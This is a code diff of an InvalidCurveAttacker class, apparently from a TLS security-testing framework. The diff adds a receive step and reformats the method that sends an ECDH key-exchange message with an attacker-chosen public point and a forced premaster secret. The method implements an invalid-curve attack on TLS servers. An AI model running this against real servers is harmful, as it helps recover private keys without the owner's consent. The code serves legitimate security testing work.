@@ -120,40 +120,43 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
 
     private WorkflowTrace executeProtocolFlow() {
         Config tlsConfig = config.createConfig();
-        tlsConfig.setDefaultTimeout(5000);
 
         WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createHelloWorkflow();
         trace.addTlsAction(new SendAction(new ECDHClientKeyExchangeMessage(tlsConfig), new ChangeCipherSpecMessage(
                 tlsConfig), new FinishedMessage(tlsConfig)));
+        trace.addTlsAction(new ReceiveAction(new ChangeCipherSpecMessage(), new FinishedMessage()));
         State state = new State(tlsConfig, trace);
         WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                 tlsConfig.getWorkflowExecutorType(), state);
         ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil.getFirstSendMessage(
                 HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
 
-//        // modify public point base X coordinate
-//        ModifiableBigInteger x = ModifiableVariableFactory.createBigIntegerModifiableVariable();
-//        x.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseX()));
-//        message.setPublicKeyBaseX(x);
-//        System.out.println(config.getPublicPointBaseX().toString(16));
-//        // modify public point base Y coordinate
-//        ModifiableBigInteger y = ModifiableVariableFactory.createBigIntegerModifiableVariable();
-//        y.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseY()));
-//        message.setPublicKeyBaseY(y);
+        // // modify public point base X coordinate
+        // ModifiableBigInteger x =
+        // ModifiableVariableFactory.createBigIntegerModifiableVariable();
+        // x.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseX()));
+        // message.setPublicKeyBaseX(x);
+        // System.out.println(config.getPublicPointBaseX().toString(16));
+        // // modify public point base Y coordinate
+        // ModifiableBigInteger y =
+        // ModifiableVariableFactory.createBigIntegerModifiableVariable();
+        // y.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseY()));
+        // message.setPublicKeyBaseY(y);
         ModifiableByteArray serializedPublicKey = ModifiableVariableFactory.createByteArrayModifiableVariable();
-        byte[] points = ArrayConverter.concatenate( ArrayConverter.bigIntegerToByteArray(config.getPublicPointBaseX()), 
-                ArrayConverter.bigIntegerToByteArray(config.getPublicPointBaseY()) );
-        byte[] serialized = ArrayConverter.concatenate(new byte[] {4}, points);
+        byte[] points = ArrayConverter.concatenate(ArrayConverter.bigIntegerToByteArray(config.getPublicPointBaseX()),
+                ArrayConverter.bigIntegerToByteArray(config.getPublicPointBaseY()));
+        byte[] serialized = ArrayConverter.concatenate(new byte[] { 4 }, points);
         serializedPublicKey.setModification(ByteArrayModificationFactory.explicitValue(serialized));
         message.setPublicKey(serializedPublicKey);
-//         set explicit premaster secret value (X value of the resulting point
-//         coordinate)
+        // set explicit premaster secret value (X value of the resulting point
+        // coordinate)
         ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
         byte[] explicitPMS = BigIntegers.asUnsignedByteArray(config.getCurveFieldSize(), premasterSecret);
         pms.setModification(ByteArrayModificationFactory.explicitValue(explicitPMS));
         message.prepareComputations();
         message.getComputations().setPremasterSecret(pms);
-        System.out.println("working with the follwoing premaster secret: " + ArrayConverter.bytesToHexString(explicitPMS));
+        System.out.println("working with the follwoing premaster secret: "
+                + ArrayConverter.bytesToHexString(explicitPMS));
         workflowExecutor.executeWorkflow();
         return trace;
     }
